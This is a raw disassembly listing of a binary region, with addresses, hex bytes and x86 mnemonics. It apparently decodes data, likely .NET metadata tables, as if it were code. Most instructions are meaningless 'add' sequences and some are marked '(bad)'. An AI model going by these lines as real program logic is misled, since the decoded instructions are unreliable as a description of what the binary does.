  406384:	96                   	xchg   %eax,%esi
  406385:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  40638b:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  40638e:	00 00                	add    %al,(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	96                   	xchg   %eax,%esi
  406393:	00 c4                	add    %al,%ah
  406395:	04 58                	add    $0x58,%al
  406397:	00 11                	add    %dl,(%ecx)
  406399:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 96 00 8b 19 9a    	add    %dl,-0x65e67500(%esi)
  4063a5:	00 12                	add    %dl,(%edx)
  4063a7:	00 c8                	add    %cl,%al
  4063a9:	30 00                	xor    %al,(%eax)
  4063ab:	00 00                	add    %al,(%eax)
  4063ad:	00 91 00 fb 0c 9a    	add    %dl,-0x65f30500(%ecx)
  4063b3:	00 13                	add    %dl,(%ebx)
  4063b5:	00 35 21 00 00 00    	add    %dh,0x21
  4063bb:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  4063c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063c4:	10 31                	adc    %dh,(%ecx)
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	96                   	xchg   %eax,%esi
  4063cb:	00 08                	add    %cl,(%eax)
  4063cd:	0f 0a                	(bad)
  4063cf:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d2:	78 20                	js     0x4063f4
  4063d4:	00 00                	add    %al,(%eax)
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	86 18                	xchg   %bl,(%eax)
  4063da:	03 15 0e 00 14 00    	add    0x14000e,%edx
  4063e0:	41                   	inc    %ecx
  4063e1:	21 00                	and    %eax,(%eax)
  4063e3:	00 00                	add    %al,(%eax)
  4063e5:	00 96 00 41 17 0a    	add    %dl,0xa174100(%esi)
  4063eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ee:	f8                   	clc
  4063ef:	33 00                	xor    (%eax),%eax
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 91 00 57 0e 1d    	add    %dl,0x1d0e5700(%ecx)
  4063f9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063fc:	50                   	push   %eax
  4063fd:	34 00                	xor    $0x0,%al
  4063ff:	00 00                	add    %al,(%eax)
  406401:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  406407:	00 14 00             	add    %dl,(%eax,%eax,1)
  40640a:	a0 34 00 00 00       	mov    0x34,%al
  40640f:	00 91 00 4d 14 1d    	add    %dl,0x1d144d00(%ecx)
  406415:	00 14 00             	add    %dl,(%eax,%eax,1)
  406418:	dc 35 00 00 00 00    	fdivl  0x0
  40641e:	91                   	xchg   %eax,%ecx
  40641f:	00 e9                	add    %ch,%cl
  406421:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  406427:	36 00 00             	add    %al,%ss:(%eax)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	91                   	xchg   %eax,%ecx
  40642d:	00 85 05 1d 00 14    	add    %al,0x14001d05(%ebp)
  406433:	00 78 20             	add    %bh,0x20(%eax)
  406436:	00 00                	add    %al,(%eax)
  406438:	00 00                	add    %al,(%eax)
  40643a:	86 18                	xchg   %bl,(%eax)
  40643c:	03 15 0e 00 14 00    	add    0x14000e,%edx
  406442:	6c                   	insb   (%dx),%es:(%edi)
  406443:	36 00 00             	add    %al,%ss:(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	96                   	xchg   %eax,%esi
  406449:	00 ef                	add    %ch,%bh
  40644b:	01 c3                	add    %eax,%ebx
  40644d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406450:	f0 36 00 00          	lock add %al,%ss:(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	96                   	xchg   %eax,%esi
  406457:	00 2a                	add    %ch,(%edx)
  406459:	0d c7 00 14 00       	or     $0x1400c7,%eax
  40645e:	5c                   	pop    %esp
  40645f:	37                   	aaa
  406460:	00 00                	add    %al,(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	96                   	xchg   %eax,%esi
  406465:	00 0f                	add    %cl,(%edi)
  406467:	12 53 00             	adc    0x0(%ebx),%dl
  40646a:	15 00 7b 21 00       	adc    $0x217b00,%eax
  40646f:	00 00                	add    %al,(%eax)
  406471:	00 96 00 d2 10 1d    	add    %dl,0x1d10d200(%esi)
  406477:	00 15 00 18 39 00    	add    %dl,0x391800
  40647d:	00 00                	add    %al,(%eax)
  40647f:	00 96 00 e9 19 0a    	add    %dl,0xa19e900(%esi)
  406485:	00 15 00 90 39 00    	add    %dl,0x399000
  40648b:	00 00                	add    %al,(%eax)
  40648d:	00 96 00 b5 18 c3    	add    %dl,-0x3ce74b00(%esi)
  406493:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406499:	00 00                	add    %al,(%eax)
  40649b:	00 96 00 85 13 d5    	add    %dl,-0x2aec7b00(%esi)
  4064a1:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	00 96 00 74 12 0a    	add    %dl,0xa127400(%esi)
  4064af:	00 16                	add    %dl,(%esi)
  4064b1:	00 f8                	add    %bh,%al
  4064b3:	3a 00                	cmp    (%eax),%al
  4064b5:	00 00                	add    %al,(%eax)
  4064b7:	00 96 00 8d 06 c3    	add    %dl,-0x3cf97300(%esi)
  4064bd:	00 16                	add    %dl,(%esi)
  4064bf:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064c3:	00 00                	add    %al,(%eax)
  4064c5:	00 96 00 3a 1c 1d    	add    %dl,0x1d1c3a00(%esi)
  4064cb:	00 16                	add    %dl,(%esi)
  4064cd:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064d3:	00 96 00 2f 1c 0a    	add    %dl,0xa1c2f00(%esi)
  4064d9:	00 16                	add    %dl,(%esi)
  4064db:	00 00                	add    %al,(%eax)
  4064dd:	00 00                	add    %al,(%eax)
  4064df:	00 80 00 96 20 02    	add    %al,0x2209600(%eax)
  4064e5:	1c e0                	sbb    $0xe0,%al
  4064e7:	00 16                	add    %dl,(%esi)
  4064e9:	00 00                	add    %al,(%eax)
  4064eb:	00 00                	add    %al,(%eax)
  4064ed:	00 80 00 96 20 ed    	add    %al,-0x12df6a00(%eax)
  4064f3:	1b e4                	sbb    %esp,%esp
  4064f5:	00 16                	add    %dl,(%esi)
  4064f7:	00 00                	add    %al,(%eax)
  4064f9:	00 00                	add    %al,(%eax)
  4064fb:	00 80 00 96 20 e6    	add    %al,-0x19df6a00(%eax)
  406501:	05 ec 00 19 00       	add    $0x1900ec,%eax
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	80 00 96             	addb   $0x96,(%eax)
  40650d:	20 03                	and    %al,(%ebx)
  40650f:	1b f1                	sbb    %ecx,%esi
  406511:	00 1a                	add    %bl,(%edx)
  406513:	00 00                	add    %al,(%eax)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 80 00 96 20 ba    	add    %al,-0x45df6a00(%eax)
  40651d:	08 f8                	or     %bh,%al
  40651f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406522:	00 00                	add    %al,(%eax)
  406524:	00 00                	add    %al,(%eax)
  406526:	80 00 96             	addb   $0x96,(%eax)
  406529:	20 79 0e             	and    %bh,0xe(%ecx)
  40652c:	ff 00                	incl   (%eax)
  40652e:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  406533:	00 00                	add    %al,(%eax)
  406535:	00 96 00 c2 0b 1c    	add    %dl,0x1c0bc200(%esi)
  40653b:	01 20                	add    %esp,(%eax)
  40653d:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406541:	00 00                	add    %al,(%eax)
  406543:	00 96 00 6b 19 0a    	add    %dl,0xa196b00(%esi)
  406549:	00 22                	add    %ah,(%edx)
  40654b:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  406552:	96                   	xchg   %eax,%esi
  406553:	00 f1                	add    %dh,%cl
  406555:	19 0a                	sbb    %ecx,(%edx)
  406557:	00 22                	add    %ah,(%edx)
  406559:	00 f4                	add    %dh,%ah
  40655b:	3b 00                	cmp    (%eax),%eax
  40655d:	00 00                	add    %al,(%eax)
  40655f:	00 96 00 b8 0a 23    	add    %dl,0x230ab800(%esi)
  406565:	01 22                	add    %esp,(%edx)
  406567:	00 60 3c             	add    %ah,0x3c(%eax)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	96                   	xchg   %eax,%esi
  40656f:	00 af 0a 2a 01 24    	add    %ch,0x24012a0a(%edi)
  406575:	00 cc                	add    %cl,%ah
  406577:	3c 00                	cmp    $0x0,%al
  406579:	00 00                	add    %al,(%eax)
  40657b:	00 96 00 98 0a 84    	add    %dl,-0x7bf56800(%esi)
  406581:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  406587:	00 00                	add    %al,(%eax)
  406589:	00 96 00 b0 1c 1d    	add    %dl,0x1d1cb000(%esi)
  40658f:	00 26                	add    %ah,(%esi)
  406591:	00 cd                	add    %cl,%ch
  406593:	21 00                	and    %eax,(%eax)
  406595:	00 00                	add    %al,(%eax)
  406597:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  40659d:	00 26                	add    %ah,(%esi)
  40659f:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  4065a5:	00 96 00 0c 03 9a    	add    %dl,-0x65fcf400(%esi)
  4065ab:	00 26                	add    %ah,(%esi)
  4065ad:	00 dc                	add    %bl,%ah
  4065af:	3f                   	aas
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	91                   	xchg   %eax,%ecx
  4065b5:	00 95 05 38 01 27    	add    %dl,0x27013805(%ebp)
  4065bb:	00 e3                	add    %ah,%bl
  4065bd:	21 00                	and    %eax,(%eax)
  4065bf:	00 00                	add    %al,(%eax)
  4065c1:	00 91 00 62 03 0a    	add    %dl,0xa036200(%ecx)
  4065c7:	00 28                	add    %ch,(%eax)
  4065c9:	00 13                	add    %dl,(%ebx)
  4065cb:	22 00                	and    (%eax),%al
  4065cd:	00 00                	add    %al,(%eax)
  4065cf:	00 96 00 9f 14 3e    	add    %dl,0x3e149f00(%esi)
  4065d5:	01 28                	add    %ebp,(%eax)
  4065d7:	00 4a 22             	add    %cl,0x22(%edx)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	91                   	xchg   %eax,%ecx
  4065df:	18 09                	sbb    %cl,(%ecx)
  4065e1:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065e6:	fc                   	cld
  4065e7:	40                   	inc    %eax
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	86 18                	xchg   %bl,(%eax)
  4065ee:	03 15 6b 01 29 00    	add    0x29016b,%edx
  4065f4:	56                   	push   %esi
  4065f5:	22 00                	and    (%eax),%al
  4065f7:	00 00                	add    %al,(%eax)
  4065f9:	00 86 00 7a 1b 70    	add    %al,0x701b7a00(%esi)
  4065ff:	01 2a                	add    %ebp,(%edx)
  406601:	00 74 41 00          	add    %dh,0x0(%ecx,%eax,2)
  406605:	00 00                	add    %al,(%eax)
  406607:	00 86 00 7a 1b 75    	add    %al,0x751b7a00(%esi)
  40660d:	01 2b                	add    %ebp,(%ebx)
  40660f:	00 6e 22             	add    %ch,0x22(%esi)
  406612:	00 00                	add    %al,(%eax)
  406614:	00 00                	add    %al,(%eax)
  406616:	86 00                	xchg   %al,(%eax)
  406618:	72 1b                	jb     0x406635
  40661a:	70 01                	jo     0x40661d
  40661c:	2c 00                	sub    $0x0,%al
  40661e:	cc                   	int3
  40661f:	42                   	inc    %edx
  406620:	00 00                	add    %al,(%eax)
  406622:	00 00                	add    %al,(%eax)
  406624:	86 00                	xchg   %al,(%eax)
  406626:	72 1b                	jb     0x406643
  406628:	75 01                	jne    0x40662b
  40662a:	2d 00 8c 44 00       	sub    $0x448c00,%eax
  40662f:	00 48 00             	add    %cl,0x0(%eax)
  406632:	81 00 de 0e 7c 01    	addl   $0x17c0ede,(%eax)
  406638:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  40663f:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  406645:	00 30                	add    %dh,(%eax)
  406647:	00 bc 44 00 00 00 00 	add    %bh,0x0(%esp,%eax,2)
  40664e:	96                   	xchg   %eax,%esi
  40664f:	00 14 0d c7 00 30 00 	add    %dl,0x3000c7(,%ecx,1)
  406656:	48                   	dec    %eax
  406657:	45                   	inc    %ebp
  406658:	00 00                	add    %al,(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	96                   	xchg   %eax,%esi
  40665d:	00 14 0d 84 01 31 00 	add    %dl,0x310184(,%ecx,1)
  406664:	9f                   	lahf
  406665:	22 00                	and    (%eax),%al
  406667:	00 00                	add    %al,(%eax)
  406669:	00 96 00 40 16 2a    	add    %dl,0x2a164000(%esi)
  40666f:	01 32                	add    %esi,(%edx)
  406671:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406678:	96                   	xchg   %eax,%esi
  406679:	00 aa 0c 93 01 33    	add    %ch,0x3301930c(%edx)
  40667f:	00 88 45 00 00 00    	add    %cl,0x45(%eax)
  406685:	00 96 00 84 0c 93    	add    %dl,-0x6cf37c00(%esi)
  40668b:	01 34 00             	add    %esi,(%eax,%eax,1)
  40668e:	d0 45 00             	rolb   $1,0x0(%ebp)
  406691:	00 00                	add    %al,(%eax)
  406693:	00 96 00 b4 0c 93    	add    %dl,-0x6cf34c00(%esi)
  406699:	01 35 00 18 46 00    	add    %esi,0x461800
  40669f:	00 00                	add    %al,(%eax)
  4066a1:	00 96 00 87 16 84    	add    %dl,-0x7be97900(%esi)
  4066a7:	01 36                	add    %esi,(%esi)
  4066a9:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066af:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066b5:	01 37                	add    %esi,(%edi)
  4066b7:	00 c6                	add    %al,%dh
  4066b9:	22 00                	and    (%eax),%al
  4066bb:	00 00                	add    %al,(%eax)
  4066bd:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066c3:	01 38                	add    %edi,(%eax)
  4066c5:	00 ea                	add    %ch,%dl
  4066c7:	22 00                	and    (%eax),%al
  4066c9:	00 00                	add    %al,(%eax)
  4066cb:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066d1:	01 39                	add    %edi,(%ecx)
  4066d3:	00 fe                	add    %bh,%dh
  4066d5:	22 00                	and    (%eax),%al
  4066d7:	00 00                	add    %al,(%eax)
  4066d9:	00 96 00 bd 05 ab    	add    %dl,-0x54fa4300(%esi)
  4066df:	01 3a                	add    %edi,(%edx)
  4066e1:	00 78 20             	add    %bh,0x20(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	86 18                	xchg   %bl,(%eax)
  4066ea:	03 15 0e 00 3b 00    	add    0x3b000e,%edx
  4066f0:	0b 23                	or     (%ebx),%esp
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	00 00                	add    %al,(%eax)
  4066f6:	91                   	xchg   %eax,%ecx
  4066f7:	18 09                	sbb    %cl,(%ecx)
  4066f9:	15 0a 00 3b 00       	adc    $0x3b000a,%eax
  4066fe:	17                   	pop    %ss
  4066ff:	23 00                	and    (%eax),%eax
  406701:	00 00                	add    %al,(%eax)
  406703:	00 86 18 03 15 b1    	add    %al,-0x4eeafce8(%esi)
  406709:	01 3b                	add    %edi,(%ebx)
  40670b:	00 2d 23 00 00 00    	add    %ch,0x23
  406711:	00 e1                	add    %ah,%cl
  406713:	09 cd                	or     %ecx,%ebp
  406715:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  40671b:	23 00                	and    (%eax),%eax
  40671d:	00 00                	add    %al,(%eax)
  40671f:	00 e1                	add    %ah,%cl
  406721:	01 b9 1b bf 01 3c    	add    %edi,0x3c01bf1b(%ecx)
  406727:	00 63 23             	add    %ah,0x23(%ebx)
  40672a:	00 00                	add    %al,(%eax)
  40672c:	00 00                	add    %al,(%eax)
  40672e:	e1 01                	loope  0x406731
  406730:	a8 19                	test   $0x19,%al
  406732:	0e                   	push   %cs
  406733:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406736:	6c                   	insb   (%dx),%es:(%edi)
  406737:	23 00                	and    (%eax),%eax
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 86 18 03 15 cb    	add    %al,-0x34eafce8(%esi)
  406741:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406744:	82 23 00             	andb   $0x0,(%ebx)
  406747:	00 00                	add    %al,(%eax)
  406749:	00 86 00 22 03 d7    	add    %al,-0x28fcde00(%esi)
  40674f:	01 3e                	add    %edi,(%esi)
  406751:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  406757:	00 86 00 22 03 dc    	add    %al,-0x23fcde00(%esi)
  40675d:	01 3e                	add    %edi,(%esi)
  40675f:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  406765:	00 86 00 22 03 e2    	add    %al,-0x1dfcde00(%esi)
  40676b:	01 3f                	add    %edi,(%edi)
  40676d:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  406773:	00 86 00 22 03 e8    	add    %al,-0x17fcde00(%esi)
  406779:	01 40 00             	add    %eax,0x0(%eax)
  40677c:	cb                   	lret
  40677d:	23 00                	and    (%eax),%eax
  40677f:	00 00                	add    %al,(%eax)
  406781:	00 86 08 cc 0f ee    	add    %al,-0x11f033f8(%esi)
  406787:	01 41 00             	add    %eax,0x0(%ecx)
  40678a:	d9 23                	fldenv (%ebx)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	86 08                	xchg   %cl,(%eax)
  406792:	78 0d                	js     0x4067a1
  406794:	f4                   	hlt
  406795:	01 42 00             	add    %eax,0x0(%edx)
  406798:	e6 23                	out    %al,$0x23
  40679a:	00 00                	add    %al,(%eax)
  40679c:	00 00                	add    %al,(%eax)
  40679e:	81 00 8c 07 6b 01    	addl   $0x16b078c,(%eax)
  4067a4:	42                   	inc    %edx
  4067a5:	00 50 46             	add    %dl,0x46(%eax)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	81 00 c8 12 0e 00    	addl   $0xe12c8,(%eax)
  4067b2:	43                   	inc    %ebx
  4067b3:	00 94 46 00 00 00 00 	add    %dl,0x0(%esi,%eax,2)
  4067ba:	81 00 1d 03 d7 01    	addl   $0x1d7031d,(%eax)
  4067c0:	43                   	inc    %ebx
  4067c1:	00 bc 46 00 00 00 00 	add    %bh,0x0(%esi,%eax,2)
  4067c8:	81 00 64 0b 0a 02    	addl   $0x20a0b64,(%eax)
  4067ce:	43                   	inc    %ebx
  4067cf:	00 38                	add    %bh,(%eax)
  4067d1:	47                   	inc    %edi
  4067d2:	00 00                	add    %al,(%eax)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	86 00                	xchg   %al,(%eax)
  4067d8:	12 19                	adc    (%ecx),%bl
  4067da:	dc 01                	faddl  (%ecx)
  4067dc:	44                   	inc    %esp
  4067dd:	00 00                	add    %al,(%eax)
  4067df:	24 00                	and    $0x0,%al
  4067e1:	00 00                	add    %al,(%eax)
  4067e3:	00 81 00 9b 04 d7    	add    %al,-0x28fb6500(%ecx)
  4067e9:	01 45 00             	add    %eax,0x0(%ebp)
  4067ec:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067ef:	00 00                	add    %al,(%eax)
  4067f1:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067f7:	01 45 00             	add    %eax,0x0(%ebp)
  4067fa:	42                   	inc    %edx
  4067fb:	24 00                	and    $0x0,%al
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 86 00 b1 04 d7    	add    %al,-0x28fb4f00(%esi)
  406805:	01 45 00             	add    %eax,0x0(%ebp)
  406808:	64 47                	fs inc %edi
  40680a:	00 00                	add    %al,(%eax)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	81 00 6b 12 0f 02    	addl   $0x20f126b,(%eax)
  406814:	45                   	inc    %ebp
  406815:	00 2c 48             	add    %ch,(%eax,%ecx,2)
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	81 00 4c 1c 0f 02    	addl   $0x20f1c4c,(%eax)
  406822:	46                   	inc    %esi
  406823:	00 4a 24             	add    %cl,0x24(%edx)
  406826:	00 00                	add    %al,(%eax)
  406828:	00 00                	add    %al,(%eax)
  40682a:	86 00                	xchg   %al,(%eax)
  40682c:	dc 13                	fcoml  (%ebx)
  40682e:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  406833:	24 00                	and    $0x0,%al
  406835:	00 00                	add    %al,(%eax)
  406837:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  40683d:	02 48 00             	add    0x0(%eax),%cl
  406840:	e0 48                	loopne 0x40688a
  406842:	00 00                	add    %al,(%eax)
  406844:	00 00                	add    %al,(%eax)
  406846:	86 00                	xchg   %al,(%eax)
  406848:	b6 00                	mov    $0x0,%dh
  40684a:	1f                   	pop    %ds
  40684b:	02 49 00             	add    0x0(%ecx),%cl
  40684e:	88 49 00             	mov    %cl,0x0(%ecx)
  406851:	00 00                	add    %al,(%eax)
  406853:	00 86 00 cf 13 23    	add    %al,0x2313cf00(%esi)
  406859:	02 49 00             	add    0x0(%ecx),%cl
  40685c:	30 4a 00             	xor    %cl,0x0(%edx)
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 86 00 fc 18 27    	add    %al,0x2718fc00(%esi)
  406867:	02 49 00             	add    0x0(%ecx),%cl
  40686a:	74 24                	je     0x406890
  40686c:	00 00                	add    %al,(%eax)
  40686e:	00 00                	add    %al,(%eax)
  406870:	86 00                	xchg   %al,(%eax)
  406872:	ac                   	lods   %ds:(%esi),%al
  406873:	16                   	push   %ss
  406874:	2b 02                	sub    (%edx),%eax
  406876:	49                   	dec    %ecx
  406877:	00 c4                	add    %al,%ah
  406879:	4a                   	dec    %edx
  40687a:	00 00                	add    %al,(%eax)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	86 00                	xchg   %al,(%eax)
  406880:	a1 16 31 02 4a       	mov    0x4a023116,%eax
  406885:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  40688b:	00 86 00 22 03 36    	add    %al,0x36032200(%esi)
  406891:	02 4a 00             	add    0x0(%edx),%cl
  406894:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  40689b:	00 22                	add    %ah,(%edx)
  40689d:	03 3c 02             	add    (%edx,%eax,1),%edi
  4068a0:	4c                   	dec    %esp
  4068a1:	00 74 4b 00          	add    %dh,0x0(%ebx,%ecx,2)
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 86 00 91 16 42    	add    %al,0x42169100(%esi)
  4068ad:	02 4e 00             	add    0x0(%esi),%cl
  4068b0:	cc                   	int3
  4068b1:	4b                   	dec    %ebx
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	86 00                	xchg   %al,(%eax)
  4068b8:	61                   	popa
  4068b9:	06                   	push   %es
  4068ba:	42                   	inc    %edx
  4068bb:	02 4f 00             	add    0x0(%edi),%cl
  4068be:	18 4c 00 00          	sbb    %cl,0x0(%eax,%eax,1)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	86 00                	xchg   %al,(%eax)
  4068c6:	32 19                	xor    (%ecx),%bl
  4068c8:	dc 01                	faddl  (%ecx)
  4068ca:	50                   	push   %eax
  4068cb:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068d1:	00 86 00 46 0f 0e    	add    %al,0xe0f4600(%esi)
  4068d7:	00 51 00             	add    %dl,0x0(%ecx)
  4068da:	c6                   	(bad)
  4068db:	24 00                	and    $0x0,%al
  4068dd:	00 00                	add    %al,(%eax)
  4068df:	00 86 00 9e 0c 6b    	add    %al,0x6b0c9e00(%esi)
  4068e5:	01 51 00             	add    %edx,0x0(%ecx)
  4068e8:	d6                   	salc
  4068e9:	24 00                	and    $0x0,%al
  4068eb:	00 00                	add    %al,(%eax)
  4068ed:	00 86 00 92 0c 47    	add    %al,0x470c9200(%esi)
  4068f3:	02 52 00             	add    0x0(%edx),%dl
  4068f6:	f4                   	hlt
  4068f7:	24 00                	and    $0x0,%al
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 86 00 76 10 4b    	add    %al,0x4b107600(%esi)
  406901:	02 52 00             	add    0x0(%edx),%dl
  406904:	09 25 00 00 00 00    	or     %esp,0x0
  40690a:	86 00                	xchg   %al,(%eax)
  40690c:	3a 06                	cmp    (%esi),%al
  40690e:	50                   	push   %eax
  40690f:	02 53 00             	add    0x0(%ebx),%dl
  406912:	1f                   	pop    %ds
  406913:	25 00 00 00 00       	and    $0x0,%eax
  406918:	86 00                	xchg   %al,(%eax)
  40691a:	07                   	pop    %es
  40691b:	19 55 02             	sbb    %edx,0x2(%ebp)
  40691e:	54                   	push   %esp
  40691f:	00 d4                	add    %dl,%ah
  406921:	4c                   	dec    %esp
  406922:	00 00                	add    %al,(%eax)
  406924:	00 00                	add    %al,(%eax)
  406926:	86 00                	xchg   %al,(%eax)
  406928:	77 16                	ja     0x406940
  40692a:	2b 02                	sub    (%edx),%eax
  40692c:	55                   	push   %ebp
  40692d:	00 2c 4d 00 00 00 00 	add    %ch,0x0(,%ecx,2)
  406934:	86 00                	xchg   %al,(%eax)
  406936:	52                   	push   %edx
  406937:	06                   	push   %es
  406938:	6b 01 56             	imul   $0x56,(%ecx),%eax
  40693b:	00 50 4d             	add    %dl,0x4d(%eax)
  40693e:	00 00                	add    %al,(%eax)
  406940:	00 00                	add    %al,(%eax)
  406942:	86 00                	xchg   %al,(%eax)
  406944:	8e 0f                	mov    (%edi),%cs
  406946:	0f 02 57 00          	lar    0x0(%edi),%edx
  40694a:	64 53                	fs push %ebx
  40694c:	00 00                	add    %al,(%eax)
  40694e:	00 00                	add    %al,(%eax)
  406950:	86 00                	xchg   %al,(%eax)
  406952:	33 16                	xor    (%esi),%edx
  406954:	31 02                	xor    %eax,(%edx)
  406956:	58                   	pop    %eax
  406957:	00 d0                	add    %dl,%al
  406959:	53                   	push   %ebx
  40695a:	00 00                	add    %al,(%eax)
  40695c:	00 00                	add    %al,(%eax)
  40695e:	86 00                	xchg   %al,(%eax)
  406960:	5d                   	pop    %ebp
  406961:	0f                   	(bad)
  406962:	0f 02 58 00          	lar    0x0(%eax),%ebx
  406966:	34 25                	xor    $0x25,%al
  406968:	00 00                	add    %al,(%eax)
  40696a:	00 00                	add    %al,(%eax)
  40696c:	86 08                	xchg   %cl,(%eax)
  40696e:	6a 0c                	push   $0xc
  406970:	47                   	inc    %edi
  406971:	02 59 00             	add    0x0(%ecx),%bl
  406974:	3c 25                	cmp    $0x25,%al
  406976:	00 00                	add    %al,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	86 08                	xchg   %cl,(%eax)
  40697c:	77 0c                	ja     0x40698a
  40697e:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406981:	00 45 25             	add    %al,0x25(%ebp)
  406984:	00 00                	add    %al,(%eax)
  406986:	00 00                	add    %al,(%eax)
  406988:	86 08                	xchg   %cl,(%eax)
  40698a:	b3 13                	mov    $0x13,%bl
  40698c:	23 02                	and    (%edx),%eax
  40698e:	5a                   	pop    %edx
  40698f:	00 4d 25             	add    %cl,0x25(%ebp)
  406992:	00 00                	add    %al,(%eax)
  406994:	00 00                	add    %al,(%eax)
  406996:	86 08                	xchg   %cl,(%eax)
  406998:	c1 13 15             	rcll   $0x15,(%ebx)
  40699b:	02 5a 00             	add    0x0(%edx),%bl
  40699e:	56                   	push   %esi
  40699f:	25 00 00 00 00       	and    $0x0,%eax
  4069a4:	86 08                	xchg   %cl,(%eax)
  4069a6:	e4 18                	in     $0x18,%al
  4069a8:	27                   	daa
  4069a9:	02 5b 00             	add    0x0(%ebx),%bl
  4069ac:	5e                   	pop    %esi
  4069ad:	25 00 00 00 00       	and    $0x0,%eax
  4069b2:	86 08                	xchg   %cl,(%eax)
  4069b4:	f0 18 55 02          	lock sbb %dl,0x2(%ebp)
  4069b8:	5b                   	pop    %ebx
  4069b9:	00 c8                	add    %cl,%al
  4069bb:	54                   	push   %esp
  4069bc:	00 00                	add    %al,(%eax)
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	86 08                	xchg   %cl,(%eax)
  4069c2:	7c 1c                	jl     0x4069e0
  4069c4:	5a                   	pop    %edx
  4069c5:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c9:	25 00 00 00 00       	and    $0x0,%eax
  4069ce:	86 08                	xchg   %cl,(%eax)
  4069d0:	f4                   	hlt
  4069d1:	07                   	pop    %es
  4069d2:	5f                   	pop    %edi
  4069d3:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069d7:	25 00 00 00 00       	and    $0x0,%eax
  4069dc:	e1 01                	loope  0x4069df
  4069de:	cc                   	int3
  4069df:	14 64                	adc    $0x64,%al
  4069e1:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069e5:	25 00 00 00 00       	and    $0x0,%eax
